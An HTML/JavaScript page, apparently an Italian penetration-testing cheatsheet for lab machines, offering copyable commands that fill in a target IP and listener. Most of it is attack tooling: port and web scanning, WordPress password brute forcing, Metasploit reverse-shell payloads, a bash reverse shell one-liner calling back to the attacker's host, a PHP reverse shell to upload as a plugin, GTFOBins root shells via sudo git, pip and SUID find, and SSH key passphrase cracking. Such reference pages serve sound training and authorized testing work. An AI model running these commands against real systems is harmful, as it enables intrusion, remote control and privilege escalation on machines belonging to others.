<!DOCTYPE html>
<html lang="it">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>pentest cheatsheet</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Inter:wght@400;450;500&display=swap" rel="stylesheet">
<style>
  :root{
    color-scheme: dark;
    --bg:#0b0f1a;
    --bg-grad:#0c1322;
    --surface:#111a2b;
    --surface-2:#0e1626;
    --line:#223049;
    --line-soft:#1a2436;
    --text:#cdd6e5;
    --text-dim:#808fab;
    --text-faint:#56637d;
    --amber:#f0b429;
    --amber-soft:rgba(240,180,41,.13);
    --amber-line:rgba(240,180,41,.35);
    --cyan:#4cc8c0;
    --blue:#5b9bd5;
    --orange:#e8853a;
    --violet:#a98bdb;
    --red:#e06c6c;
    --mono:'JetBrains Mono',ui-monospace,SFMono-Regular,Menlo,monospace;
    --sans:'Inter',system-ui,-apple-system,sans-serif;
    box-sizing:border-box;
    padding-top:env(safe-area-inset-top,0px);
    padding-bottom:env(safe-area-inset-bottom,0px);
  }
  *,*::before,*::after{box-sizing:border-box}
  html{scroll-padding-top:168px}
  body{
    margin:0;
    background:
      radial-gradient(1200px 600px at 80% -10%, #10203a 0%, transparent 60%),
      linear-gradient(180deg,var(--bg-grad),var(--bg));
    background-attachment:fixed;
    color:var(--text);
    font-family:var(--sans);
    font-size:15px;
    line-height:1.5;
    -webkit-font-smoothing:antialiased;
  }

  /* ---------- Console header ---------- */
  header{
    position:sticky;top:0;z-index:30;
    background:rgba(10,14,24,.86);
    backdrop-filter:blur(14px);
    border-bottom:1px solid var(--line);
    padding-top:env(safe-area-inset-top,0px);
  }
  body::before{content:"";position:fixed;inset:0 0 auto;height:env(safe-area-inset-top,0px);background:rgba(10,14,24,.92);z-index:31}
  .console{max-width:1180px;margin:0 auto;padding:14px 22px 16px}
  .brandline{
    display:flex;align-items:center;gap:10px;font-family:var(--mono);
    font-size:13px;color:var(--text-dim);margin-bottom:12px;flex-wrap:wrap;
  }
  .prompt{color:var(--cyan)}
  .prompt .host{color:var(--amber)}
  .brandline .blink{width:8px;height:15px;background:var(--amber);display:inline-block;animation:blink 1.15s step-end infinite;vertical-align:-2px;border-radius:1px}
  @keyframes blink{50%{opacity:0}}
  .brandline .sub{color:var(--text-faint)}

  .controls{display:flex;gap:14px;flex-wrap:wrap;align-items:flex-end}
  .field{display:flex;flex-direction:column;gap:5px;flex:1 1 180px;min-width:150px}
  .field.port{flex:0 1 120px;min-width:100px}
  .field label{
    font-family:var(--mono);font-size:11px;letter-spacing:.04em;
    color:var(--text-dim);display:flex;align-items:center;gap:6px;
  }
  .field label .dot{width:7px;height:7px;border-radius:2px;background:var(--amber);box-shadow:0 0 8px var(--amber-line)}
  .field input{
    font-family:var(--mono);font-size:15px;font-weight:500;
    background:var(--surface-2);border:1px solid var(--line);
    color:var(--amber);border-radius:7px;padding:9px 12px;width:100%;
    transition:border-color .15s,box-shadow .15s;
  }
  .field input::placeholder{color:var(--text-faint);font-weight:400}
  .field input:focus{outline:none;border-color:var(--amber-line);box-shadow:0 0 0 3px var(--amber-soft)}

  .search{flex:1 1 220px;min-width:170px}
  .search label .dot{background:var(--text-dim);box-shadow:none}
  .search input{color:var(--text)}
  .search input:focus{border-color:var(--text-dim);box-shadow:0 0 0 3px rgba(128,143,171,.12)}

  /* ---------- Layout ---------- */
  .wrap{max-width:1180px;margin:0 auto;padding:26px 22px 90px;display:grid;grid-template-columns:184px 1fr;gap:34px;align-items:start}

  nav.phases{position:sticky;top:166px;display:flex;flex-direction:column;gap:2px;font-family:var(--mono);font-size:13px}
  nav.phases a{
    display:flex;align-items:center;gap:10px;padding:8px 11px;border-radius:7px;
    color:var(--text-dim);text-decoration:none;border:1px solid transparent;transition:background .15s,color .15s;
  }
  nav.phases a .pdot{width:9px;height:9px;border-radius:50%;flex:none;background:var(--c)}
  nav.phases a:hover{background:var(--surface);color:var(--text)}
  nav.phases a.active{background:var(--surface);color:var(--text);border-color:var(--line-soft)}
  nav.phases a .num{color:var(--text-faint);font-size:11px;margin-left:auto}

  main{min-width:0}
  .intro{color:var(--text-dim);font-size:13.5px;margin:0 0 26px;max-width:62ch;line-height:1.6}
  .intro code{font-family:var(--mono);color:var(--amber);background:var(--amber-soft);padding:1px 6px;border-radius:4px;font-size:.92em}

  section.phase{margin-bottom:40px;scroll-margin-top:170px}
  .phase-head{display:flex;align-items:baseline;gap:12px;margin:0 0 4px;padding-left:14px;position:relative}
  .phase-head::before{content:"";position:absolute;left:0;top:3px;bottom:3px;width:3px;border-radius:2px;background:var(--c)}
  .phase-head h2{font-family:var(--mono);font-size:19px;font-weight:600;margin:0;color:var(--text);letter-spacing:-.01em}
  .phase-head .idx{font-family:var(--mono);font-size:12px;color:var(--c);font-weight:600}
  .phase-desc{color:var(--text-faint);font-size:13px;margin:0 0 16px 14px;max-width:60ch}

  .cards{display:flex;flex-direction:column;gap:9px}
  .card{
    background:var(--surface);border:1px solid var(--line-soft);border-radius:10px;
    border-left:3px solid var(--c);overflow:hidden;transition:border-color .15s;
  }
  .card:hover{border-color:var(--line);border-left-color:var(--c)}
  .cmd-row{display:flex;align-items:stretch;gap:0}
  .cmd{
    font-family:var(--mono);font-size:13.5px;line-height:1.65;flex:1;min-width:0;
    padding:12px 14px;white-space:pre-wrap;word-break:break-word;cursor:pointer;
  }
  .cmd .pfx{color:var(--text-faint);user-select:none}
  .cmd .var{color:var(--amber);background:var(--amber-soft);border-radius:3px;padding:0 3px;font-weight:600;box-decoration-break:clone;-webkit-box-decoration-break:clone}
  .cmd .var.empty{color:var(--text-faint);font-weight:500;font-style:normal}
  .cmd .man{color:var(--violet);font-style:italic}
  .cmd .cm{color:var(--text-faint)}
  .copy{
    flex:none;align-self:stretch;display:flex;align-items:center;gap:6px;
    background:transparent;border:none;border-left:1px solid var(--line-soft);
    color:var(--text-dim);font-family:var(--mono);font-size:11.5px;letter-spacing:.03em;
    padding:0 15px;cursor:pointer;transition:background .15s,color .15s;white-space:nowrap;
  }
  .copy svg{width:14px;height:14px}
  .copy:hover{background:var(--surface-2);color:var(--text)}
  .copy.done{color:var(--cyan)}
  .card-foot{
    display:flex;align-items:center;gap:10px;padding:0 14px 11px;margin-top:-2px;
    font-family:var(--sans);
  }
  .note{color:var(--text-dim);font-size:12.5px;line-height:1.45;flex:1}
  .docs{
    flex:none;font-family:var(--mono);font-size:11.5px;text-decoration:none;
    color:var(--text-faint);border:1px solid var(--line-soft);border-radius:6px;
    padding:3px 9px;transition:color .15s,border-color .15s;white-space:nowrap;
  }
  .docs:hover{color:var(--cyan);border-color:rgba(76,200,192,.4)}
  .docs .ar{opacity:.7}

  .empty-note{display:none;color:var(--text-faint);font-family:var(--mono);font-size:13px;padding:30px 0;text-align:center}
  .empty-note.show{display:block}

  footer{max-width:1180px;margin:0 auto;padding:0 22px 60px}
  .foot-inner{border-top:1px solid var(--line-soft);padding-top:22px;color:var(--text-faint);font-size:12.5px;font-family:var(--mono);display:flex;justify-content:space-between;gap:14px;flex-wrap:wrap}
  .foot-inner .warn{color:var(--text-dim)}

  .toast{
    position:fixed;left:50%;bottom:26px;transform:translateX(-50%) translateY(20px);
    background:var(--surface);border:1px solid var(--amber-line);color:var(--text);
    font-family:var(--mono);font-size:13px;padding:10px 18px;border-radius:9px;
    box-shadow:0 10px 40px rgba(0,0,0,.5);opacity:0;pointer-events:none;
    transition:opacity .2s,transform .2s;z-index:50;
  }
  .toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
  .toast b{color:var(--amber)}

  @media (max-width:820px){
    html{scroll-padding-top:0}
    .wrap{grid-template-columns:1fr;gap:20px;padding:20px 16px 80px}
    nav.phases{position:static;flex-direction:row;overflow-x:auto;gap:6px;padding-bottom:4px;margin:-4px -16px 4px;padding-left:16px;padding-right:16px}
    nav.phases a{flex:none;border:1px solid var(--line-soft)}
    nav.phases a .num{display:none}
    .console{padding:12px 16px 14px}
    section.phase{scroll-margin-top:12px}
    .copy span.lbl{display:none}
    .copy{padding:0 13px}
  }
  @media (prefers-reduced-motion:reduce){
    *{animation-duration:.001ms!important;transition-duration:.001ms!important}
    .brandline .blink{animation:none}
  }
</style>
</head>
<body>

<header>
  <div class="console">
    <div class="brandline">
      <span class="prompt"><span class="host">root@kali</span>:</span>
      <span>cheatsheet</span>
      <span class="blink"></span>
      <span class="sub">— Made by @simonegrimaldi</span>
    </div>
    <div class="controls">
      <div class="field">
        <label><span class="dot"></span>Target IP <span style="color:var(--text-faint)">&lt;TARGET&gt;</span></label>
        <input id="in-target" type="text" inputmode="decimal" autocomplete="off" spellcheck="false" placeholder="es. 10.10.10.5">
      </div>
      <div class="field">
        <label><span class="dot"></span>Il tuo IP <span style="color:var(--text-faint)">&lt;LHOST&gt;</span></label>
        <input id="in-lhost" type="text" inputmode="decimal" autocomplete="off" spellcheck="false" placeholder="es. 10.10.14.2">
      </div>
      <div class="field port">
        <label><span class="dot"></span>Listener port</label>
        <input id="in-lport" type="text" inputmode="numeric" autocomplete="off" spellcheck="false" placeholder="4444">
      </div>
      <div class="field search">
        <label><span class="dot"></span>cerca comando</label>
        <input id="in-search" type="text" autocomplete="off" spellcheck="false" placeholder="nmap, sudo -l, reverse shell…">
      </div>
    </div>
  </div>
</header>

<div class="wrap">
  <nav class="phases" id="nav"></nav>
  <main>
    <div id="sections"></div>
    <div class="empty-note" id="empty">nessun comando corrisponde alla ricerca.</div>
  </main>
</div>

<footer>
  <div class="foot-inner">
    <span>pentest://cheatsheet</span>
    <span class="warn">solo per attività autorizzate e ambienti di test</span>
  </div>
</footer>

<div class="toast" id="toast"></div>

<script>
/* ============ DATA ============
   Token:  {{TARGET}} {{LHOST}} {{LPORT}} = variabili live
           <WORD> = segnaposto manuale (viola) da adattare a mano
           // ... = commento (grigio)                                   */

const PHASES = [
  {
    id:"recon", idx:"01", name:"Reconnaissance", color:"var(--cyan)",
    desc:"Scoprire il proprio IP, gli host vivi sulla rete e le porte/servizi aperti sul bersaglio.",
    cmds:[
      {c:"ifconfig", n:"Mostra il tuo indirizzo IP e l'interfaccia di rete. Alternativa moderna: ip a.", d:["man ifconfig","https://man7.org/linux/man-pages/man8/ifconfig.8.html"]},
      {c:"sudo netdiscover -r {{LHOST}}/24", n:"Enumera gli host vivi sulla tua sottorete via ARP, senza inviare pacchetti rumorosi.", d:["netdiscover","https://github.com/netdiscover-scanner/netdiscover"]},
      {c:"nmap -sn {{LHOST}}/24", n:"Ping/ARP sweep: elenca gli host attivi nella /24 senza scansionare le porte.", d:["nmap host discovery","https://nmap.org/book/host-discovery.html"]},
      {c:"sudo nmap {{TARGET}} -p- -A -T4 -Pn -oN scan.txt", n:"Scansione completa di tutte le 65535 porte con rilevamento servizi/OS, salvata su file. Scan di riferimento.", d:["nmap man","https://nmap.org/book/man.html"]},
      {c:"nmap -sCV -p- {{TARGET}} -vvv", n:"Tutte le porte con script di default + versione dei servizi, output verboso per più dettagli.", d:["nmap -sC -sV","https://nmap.org/book/man-version-detection.html"]},
      {c:"nmap -A {{TARGET}} -Pn", n:"Scansione aggressiva rapida sulle porte comuni, saltando il controllo \"host up\".", d:["nmap man","https://nmap.org/book/man.html"]},
      {c:"nmap {{TARGET}} -p <PORTS> -A", n:"Approfondisci solo le porte già trovate aperte (es. 80,443,7744) con servizi e script.", d:["nmap -p","https://nmap.org/book/man-port-specification.html"]},
      {c:"nmap --script=vuln {{TARGET}}", n:"Lancia tutti gli script NSE della categoria \"vuln\": scansione automatica di vulnerabilità note.", d:["nmap NSE vuln","https://nmap.org/nsedoc/categories/vuln.html"]},
      {c:"nmap -p<PORT> --script <SCRIPT> {{TARGET}}", n:"Esegue un singolo script NSE su una porta (es. --script http-vuln-cve2014-3704).", d:["NSE scripts","https://nmap.org/nsedoc/"]},
      {c:"nmap -p139 --script smb-enum-shares {{TARGET}}", n:"Enumera le condivisioni SMB e i relativi permessi di lettura/scrittura sul bersaglio.", d:["smb-enum-shares","https://nmap.org/nsedoc/scripts/smb-enum-shares.html"]},
    ]
  },
  {
    id:"enum", idx:"02", name:"Enumeration", color:"var(--blue)",
    desc:"Mappare il web server, le directory nascoste, gli utenti e cercare exploit per le versioni trovate.",
    cmds:[
      {c:"dirsearch -u http://{{TARGET}}/ --http-method=GET --exclude-status=300-399,400-499,500-599", n:"Enumera directory e file nascosti scartando i codici di errore/redirect.", d:["dirsearch","https://github.com/maurosoria/dirsearch"]},
      {c:"gobuster dir -u http://{{TARGET}}/ -w /usr/share/dirb/wordlists/common.txt", n:"Brute force di directory e file su un web server, anche senza link visibili.", d:["gobuster","https://github.com/OJ/gobuster"]},
      {c:"ffuf -w /usr/share/dirb/wordlists/common.txt -u http://{{TARGET}}/FUZZ", n:"Fuzzing dei percorsi: sostituisce FUZZ con ogni parola della wordlist.", d:["ffuf","https://github.com/ffuf/ffuf"]},
      {c:"ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://{{TARGET}}/FUZZ -c -ic -fc 403,404 -e .txt", n:"Fuzzing più profondo: ignora i commenti, filtra 403/404 e prova anche l'estensione .txt.", d:["ffuf options","https://github.com/ffuf/ffuf#usage"]},
      {c:"nikto -h http://{{TARGET}}/", n:"Scansione del web server: header, file sensibili, certificato SSL/TLS e vulnerabilità note.", d:["nikto","https://github.com/sullo/nikto"]},
      {c:"curl -i http://{{TARGET}}/robots.txt", n:"Spesso rivela percorsi che il sito vuole tenere nascosti (Disallow). Vale sempre un'occhiata.", d:["curl","https://curl.se/docs/manpage.html"]},
      {c:"smbclient -L //{{TARGET}}/ -N", n:"Elenca le condivisioni SMB in accesso anonimo (-N = senza password).", d:["smbclient","https://www.samba.org/samba/docs/current/man-html/smbclient.1.html"]},
      {c:"wpscan --url http://{{TARGET}}/ -e u", n:"Enumera gli utenti registrati di un sito WordPress.", d:["wpscan","https://github.com/wpscanteam/wpscan"]},
      {c:"wpscan --url https://{{TARGET}}:<PORT>/<path> -e u --disable-tls-checks", n:"Come sopra ma su HTTPS, ignorando un certificato non valido.", d:["wpscan","https://github.com/wpscanteam/wpscan"]},
      {c:"wpscan --url http://{{TARGET}}/ -U <USER> -P /usr/share/wordlists/rockyou.txt", n:"Attacco a dizionario sulla password di un utente WordPress. rockyou è intercambiabile con altre wordlist.", d:["wpscan","https://github.com/wpscanteam/wpscan"]},
      {c:"cewl -w password.txt http://{{TARGET}}/", n:"Costruisce una wordlist dalle parole presenti nel sito, utile per attacchi a dizionario mirati.", d:["cewl","https://github.com/digininja/CeWL"]},
      {c:"searchsploit <SERVICE> <VERSION>", n:"Cerca su Exploit-DB exploit noti per un servizio e una versione (es. ProFTPD 1.3.3c).", d:["searchsploit","https://www.exploit-db.com/searchsploit"]},
    ]
  },
  {
    id:"exploit", idx:"03", name:"Exploitation", color:"var(--orange)",
    desc:"Sfruttare un servizio vulnerabile con Metasploit o aprire una reverse shell manuale verso di te.",
    cmds:[
      {c:"msfconsole -q", n:"Avvia la console Metasploit senza banner.", d:["metasploit","https://docs.metasploit.com/"]},
      {c:"search <TERM>", n:"Dentro msf: cerca un modulo (es. trans2open, smb_version, drupal).", d:["msf search","https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html"]},
      {c:"use <MODULE>", n:"Seleziona il modulo/exploit trovato.", d:["metasploit","https://docs.metasploit.com/"]},
      {c:"show options", n:"Mostra i parametri richiesti dal modulo selezionato.", d:["metasploit","https://docs.metasploit.com/"]},
      {c:"set RHOSTS {{TARGET}}", n:"Imposta l'host bersaglio.", d:["metasploit","https://docs.metasploit.com/"]},
      {c:"set RPORT <PORT>", n:"Imposta la porta del servizio bersaglio (es. 139 per Samba).", d:["metasploit","https://docs.metasploit.com/"]},
      {c:"set LHOST {{LHOST}}", n:"Il tuo IP: dove il payload richiamerà la connessione inversa.", d:["metasploit","https://docs.metasploit.com/"]},
      {c:"set LPORT {{LPORT}}", n:"La porta su cui riceverai la shell.", d:["metasploit","https://docs.metasploit.com/"]},
      {c:"set payload linux/x86/shell/reverse_tcp", n:"Sceglie un payload che fa connettere il target verso di te (reverse TCP).", d:["msf payloads","https://docs.metasploit.com/docs/using-metasploit/basics/how-payloads-work.html"]},
      {c:"run", n:"Lancia l'exploit. Se va a buon fine ottieni una sessione (shell / meterpreter).", d:["metasploit","https://docs.metasploit.com/"]},
      {c:"sudo nc -nvlp {{LPORT}}", n:"Mette in ascolto un listener netcat in attesa della shell in arrivo dal target.", d:["netcat","https://linux.die.net/man/1/nc"]},
      {c:"bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1", n:"Reverse shell bash one-liner: la esegui sul target per richiamare il tuo listener.", d:["reverse shells","https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md"]},
      {c:"$ip = '{{LHOST}}';   // CHANGE THIS\n$port = {{LPORT}};    // CHANGE THIS", n:"Le due righe da modificare in php-reverse-shell.php prima di caricarlo (es. come plugin WordPress).", d:["php-reverse-shell","https://github.com/pentestmonkey/php-reverse-shell"]},
      {c:"ssh <USER>@{{TARGET}} -p <PORT>", n:"Accesso SSH riutilizzando credenziali trovate (il riuso password è comunissimo).", d:["ssh","https://man.openbsd.org/ssh"]},
    ]
  },
  {
    id:"shell", idx:"04", name:"Shell upgrade & escape", color:"var(--violet)",
    desc:"Trasformare una shell grezza in una interattiva ed evadere da una restricted shell (rbash).",
    cmds:[
      {c:"python3 -c 'import pty; pty.spawn(\"/bin/bash\")'", n:"Promuove una shell \"muta\" a una pty interattiva. Usa python se python3 non c'è.", d:["TTY upgrade","https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Full%20TTYs.md"]},
      {c:"echo $PATH", n:"In una restricted shell, mostra dove il sistema cerca i binari: capisci cosa puoi eseguire.", d:["rbash","https://gtfobins.github.io/"]},
      {c:":set shell=/bin/bash\n:shell", n:"Dentro vi/vim: imposta bash come shell ed evadi la restricted shell lanciandola.", d:["GTFOBins vi","https://gtfobins.github.io/gtfobins/vi/"]},
      {c:"export PATH=/bin:/usr/bin:$PATH", n:"Dopo l'escape, ripristina un PATH usabile per avere di nuovo tutti i comandi.", d:["rbash escape","https://gtfobins.github.io/"]},
      {c:"export SHELL=/bin/bash:$SHELL", n:"Allinea la variabile SHELL alla bash appena ottenuta.", d:["bash man","https://www.gnu.org/software/bash/manual/bash.html"]},
    ]
  },
  {
    id:"privesc", idx:"05", name:"Privilege Escalation", color:"var(--red)",
    desc:"Da utente non privilegiato a root: sudo misconfigurati, SUID, GTFOBins, exploit del kernel e chiavi SSH.",
    cmds:[
      {c:"whoami; id", n:"Chi sei e a quali gruppi appartieni: il punto di partenza di ogni escalation.", d:["id","https://man7.org/linux/man-pages/man1/id.1.html"]},
      {c:"uname -a", n:"Versione del kernel: serve a cercare kernel exploit applicabili.", d:["uname","https://man7.org/linux/man-pages/man1/uname.1.html"]},
      {c:"sudo -l", n:"Elenca cosa puoi eseguire via sudo (magari senza password): spesso è la via diretta a root.", d:["sudo","https://www.sudo.ws/docs/man/sudo.man/"]},
      {c:"find / -perm -u=s -type f 2>/dev/null", n:"Trova i binari con bit SUID: eseguono con i permessi del proprietario, spesso root.", d:["SUID","https://gtfobins.github.io/#+suid"]},
      {c:"find . -exec /bin/sh \\; -quit", n:"Se find è SUID, apre una shell con i privilegi del proprietario (GTFOBins).", d:["GTFOBins find","https://gtfobins.github.io/gtfobins/find/"]},
      {c:"sudo git -p help config\n!/bin/bash", n:"Se puoi usare git via sudo: apri l'help e, dentro il pager, digita !/bin/bash per una shell root.", d:["GTFOBins git","https://gtfobins.github.io/gtfobins/git/"]},
      {c:"TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh','sh','-c','sh <$(tty) >$(tty) 2>$(tty)')\" > \"$TF/setup.py\"\nsudo pip install \"$TF\"", n:"Se puoi usare pip via sudo: forza l'esecuzione di uno script come root durante l'install (GTFOBins).", d:["GTFOBins pip","https://gtfobins.github.io/gtfobins/pip/"]},
      {c:"git clone https://github.com/mzet-/linux-exploit-suggester.git\nchmod +x linux-exploit-suggester.sh\n./linux-exploit-suggester.sh", n:"Confronta il kernel del target con un DB di exploit e ti elenca quelli ad alta probabilità.", d:["LES","https://github.com/mzet-/linux-exploit-suggester"]},
      {c:"chmod 600 ssh_key.txt", n:"Permessi corretti per una chiave privata SSH trovata, altrimenti SSH la rifiuta.", d:["ssh key perms","https://man.openbsd.org/ssh"]},
      {c:"ssh2john ssh_key.txt > key.hash", n:"Converte una chiave privata SSH protetta in un hash per John.", d:["john","https://www.openwall.com/john/doc/"]},
      {c:"john --wordlist=/usr/share/wordlists/rockyou.txt key.hash", n:"Craccа la passphrase della chiave (o un hash). fasttrack.txt è un'alternativa veloce.", d:["John the Ripper","https://www.openwall.com/john/doc/"]},
      {c:"ssh -i ssh_key.txt <USER>@{{TARGET}}", n:"Accedi con la chiave privata una volta nota la passphrase.", d:["ssh -i","https://man.openbsd.org/ssh"]},
      {c:"echo <STRING> | base64 -d", n:"Decodifica blob in base64 (es. chiavi/segreti trovati nelle pagine nascoste).", d:["base64","https://man7.org/linux/man-pages/man1/base64.1.html"]},
      {c:"cat /etc/passwd", n:"Elenca gli account del sistema: utili per capire bersagli di brute force o riuso credenziali.", d:["passwd(5)","https://man7.org/linux/man-pages/man5/passwd.5.html"]},
    ]
  },
];

/* ============ STATE ============ */
const LS="pentest-cheatsheet-cfg";
const state={target:"",lhost:"",lport:""};
try{const s=JSON.parse(localStorage.getItem(LS)||"{}");Object.assign(state,s||{});}catch(e){}

const DEF={target:"<TARGET>",lhost:"<LHOST>",lport:"4444"};
const val=k=>state[k]&&state[k].trim()?state[k].trim():DEF[k];

/* ============ RENDER ============ */
const TOKEN=/(\{\{TARGET\}\}|\{\{LHOST\}\}|\{\{LPORT\}\}|<[A-Za-z_]+>)/g;
const KEYMAP={"{{TARGET}}":"target","{{LHOST}}":"lhost","{{LPORT}}":"lport"};

function renderCmd(tpl){
  const frag=document.createDocumentFragment();
  tpl.split("\n").forEach((line,li)=>{
    if(li>0) frag.appendChild(document.createElement("br"));
    const pfx=document.createElement("span");
    pfx.className="pfx"; pfx.textContent="$ "; frag.appendChild(pfx);
    let last=0,m;
    TOKEN.lastIndex=0;
    while((m=TOKEN.exec(line))){
      if(m.index>last) frag.appendChild(document.createTextNode(line.slice(last,m.index)));
      const t=m[0];
      if(KEYMAP[t]){
        const sp=document.createElement("span"); sp.className="var"; sp.dataset.k=KEYMAP[t];
        const v=val(KEYMAP[t]); sp.textContent=v;
        if(v===DEF[KEYMAP[t]]&&KEYMAP[t]!=="lport") sp.classList.add("empty");
        frag.appendChild(sp);
      } else {
        const sp=document.createElement("span"); sp.className="man"; sp.textContent=t; frag.appendChild(sp);
      }
      last=m.index+t.length;
    }
    if(last<line.length) frag.appendChild(document.createTextNode(line.slice(last)));
  });
  return frag;
}

function buildPlain(tpl){
  return tpl.replace(/\{\{TARGET\}\}/g,val("target"))
            .replace(/\{\{LHOST\}\}/g,val("lhost"))
            .replace(/\{\{LPORT\}\}/g,val("lport"));
}

const COPY_SVG='<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="11" height="11" rx="2"/><path d="M5 15V5a2 2 0 0 1 2-2h10"/></svg>';
const DONE_SVG='<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg>';

const sectionsEl=document.getElementById("sections");
const navEl=document.getElementById("nav");

PHASES.forEach(ph=>{
  // nav
  const a=document.createElement("a");
  a.href="#"+ph.id; a.dataset.id=ph.id; a.style.setProperty("--c",ph.color);
  a.innerHTML=`<span class="pdot"></span><span>${ph.name}</span><span class="num">${ph.idx}</span>`;
  navEl.appendChild(a);

  // section
  const sec=document.createElement("section");
  sec.className="phase"; sec.id=ph.id; sec.style.setProperty("--c",ph.color);
  const head=document.createElement("div"); head.className="phase-head";
  head.innerHTML=`<span class="idx">${ph.idx}</span><h2>${ph.name}</h2>`;
  sec.appendChild(head);
  const desc=document.createElement("p"); desc.className="phase-desc"; desc.textContent=ph.desc;
  sec.appendChild(desc);
  const cards=document.createElement("div"); cards.className="cards";

  ph.cmds.forEach(cmd=>{
    const card=document.createElement("div");
    card.className="card"; card.dataset.tpl=cmd.c;
    card.dataset.search=(cmd.c+" "+cmd.n).toLowerCase();

    const row=document.createElement("div"); row.className="cmd-row";
    const code=document.createElement("code"); code.className="cmd";
    code.appendChild(renderCmd(cmd.c));
    code.title="clicca per copiare";
    const btn=document.createElement("button"); btn.className="copy";
    btn.innerHTML=COPY_SVG+'<span class="lbl">copia</span>';
    row.appendChild(code); row.appendChild(btn);

    const foot=document.createElement("div"); foot.className="card-foot";
    const note=document.createElement("div"); note.className="note"; note.textContent=cmd.n;
    foot.appendChild(note);
    if(cmd.d){
      const dl=document.createElement("a"); dl.className="docs"; dl.href=cmd.d[1];
      dl.target="_blank"; dl.rel="noopener noreferrer";
      dl.innerHTML=`${cmd.d[0]} <span class="ar">↗</span>`;
      foot.appendChild(dl);
    }

    const doCopy=()=>copy(card.dataset.tpl,btn);
    code.addEventListener("click",doCopy);
    btn.addEventListener("click",e=>{e.stopPropagation();doCopy();});

    card.appendChild(row); card.appendChild(foot);
    cards.appendChild(card);
  });

  sec.appendChild(cards);
  sectionsEl.appendChild(sec);
});

/* ============ COPY ============ */
const toast=document.getElementById("toast");
let toastT;
function showToast(txt){
  toast.innerHTML="copiato &nbsp;<b>"+txt+"</b>";
  toast.classList.add("show");
  clearTimeout(toastT); toastT=setTimeout(()=>toast.classList.remove("show"),1700);
}
function copy(tpl,btn){
  const text=buildPlain(tpl);
  const done=()=>{
    if(btn){btn.classList.add("done");btn.innerHTML=DONE_SVG+'<span class="lbl">fatto</span>';
      setTimeout(()=>{btn.classList.remove("done");btn.innerHTML=COPY_SVG+'<span class="lbl">copia</span>';},1300);}
    showToast(text.length>42?text.slice(0,40)+"…":text);
  };
  if(navigator.clipboard&&navigator.clipboard.writeText){
    navigator.clipboard.writeText(text).then(done).catch(()=>fallback(text,done));
  } else fallback(text,done);
}
function fallback(text,cb){
  const ta=document.createElement("textarea");ta.value=text;ta.style.position="fixed";ta.style.opacity="0";
  document.body.appendChild(ta);ta.select();
  try{document.execCommand("copy");cb();}catch(e){}
  document.body.removeChild(ta);
}

/* ============ LIVE VARS ============ */
function refreshVars(){
  document.querySelectorAll(".cmd .var").forEach(sp=>{
    const k=sp.dataset.k,v=val(k);
    sp.textContent=v;
    sp.classList.toggle("empty",v===DEF[k]&&k!=="lport");
  });
}
function bind(id,key){
  const el=document.getElementById(id);
  el.value=state[key]||"";
  el.addEventListener("input",()=>{
    state[key]=el.value;
    try{localStorage.setItem(LS,JSON.stringify(state));}catch(e){}
    refreshVars();
  });
}
bind("in-target","target");
bind("in-lhost","lhost");
bind("in-lport","lport");

/* ============ SEARCH ============ */
const searchEl=document.getElementById("in-search");
const emptyEl=document.getElementById("empty");
searchEl.addEventListener("input",()=>{
  const q=searchEl.value.trim().toLowerCase();
  let any=false;
  PHASES.forEach(ph=>{
    const sec=document.getElementById(ph.id);
    let shown=0;
    sec.querySelectorAll(".card").forEach(c=>{
      const hit=!q||c.dataset.search.includes(q);
      c.style.display=hit?"":"none";
      if(hit)shown++;
    });
    sec.style.display=shown?"":"none";
    if(shown)any=true;
  });
  emptyEl.classList.toggle("show",!any);
});

/* ============ SCROLLSPY ============ */
const navLinks=[...navEl.querySelectorAll("a")];
const spy=new IntersectionObserver(es=>{
  es.forEach(e=>{
    if(e.isIntersecting){
      navLinks.forEach(l=>l.classList.toggle("active",l.dataset.id===e.target.id));
    }
  });
},{rootMargin:"-170px 0px -60% 0px",threshold:0});
PHASES.forEach(ph=>spy.observe(document.getElementById(ph.id)));
navLinks.forEach(l=>l.addEventListener("click",e=>{
  e.preventDefault();
  document.getElementById(l.dataset.id).scrollIntoView({behavior:"smooth",block:"start"});
}));
</script>
